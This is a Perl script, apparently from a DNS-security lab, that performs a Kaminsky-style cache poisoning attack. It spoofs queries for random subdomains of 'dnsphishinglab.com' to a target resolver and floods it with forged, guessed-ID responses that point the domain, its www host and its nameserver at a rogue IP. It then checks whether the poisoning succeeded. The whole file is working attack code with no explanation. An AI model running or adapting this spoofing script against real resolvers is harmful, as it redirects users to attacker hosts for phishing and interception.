use Net::DNS;
use Net::RawIP;
$sourceIP='192.168.0.200';
$destIP='192.168.0.10';
$destUDP=55555;
$domain_name="dnsphishinglab.com";
$rougeIP='192.168.0.201';
$response_count = 250;
my $range = 1000000;

while (1){
	$subdomain = int(rand($range));
	$query_domain = "x-". $subdomain.".".$domain_name;
	print $query_domain . "\n";
	my $dns_packet = Net::DNS::Packet->new($query_domain, "A", "IN");
	$dns_packet->header->qr(0);
	$dns_packet->header->id(int(rand($range)));
	my $dns_data = $dns_packet->data;
	my $udp_packet = new Net::RawIP({ip=> {
		saddr=>$sourceIP,
		daddr=>$destIP},
		udp=>{source=>53, dest=>$destUDP}}
	);
	$udp_packet->set({udp=>{data=>$dns_data}});
	$udp_packet->send;
	
	for (my $i = 0 ; $i < $response_count; $i++){
		my $dns_packet = Net::DNS::Packet->new($domain_name." IN A");
		$dns_packet->header->qr(1);
		$dns_packet->header->id(int(rand($range)));
		
		$dns_packet->unique_push("ans", rr_add($domain_name." 86400 IN A ". $rougeIP));
		$dns_packet->unique_push("ans", rr_add("www.".$domain_name." 86400 IN A ". $rougeIP));
		$dns_packet->unique_push("auth", rr_add($domain_name." 86400 IN SOA ns.".$domain_name));
		$dns_packet->unique_push("add", rr_add("ns.".$domain_name." 86400 IN A ". $sourceIP));
		$dns_data = $dns_packet->data;
		$udp_packet = new Net::RawIP({ip=> {
			saddr=>$sourceIP,
			daddr=>$destIP},
			udp=>{source=>53, dest=>$destUDP}}
		);
		$udp_packet->set({udp=>{data=>$dns_data}});
		$udp_packet->send;
	}
	$res = Net::DNS::Resolver->new(nameservers => [$destIP]);
	$query = $res->search("www.".$domain_name);
	if ($query){
		foreach $record ($query->answer){
			next unless $record->type eq "A";		
			print $record->address,"\n";
			print "ATTTACKED!!! SUCCESS!!";
			exit;
		}
	}
}
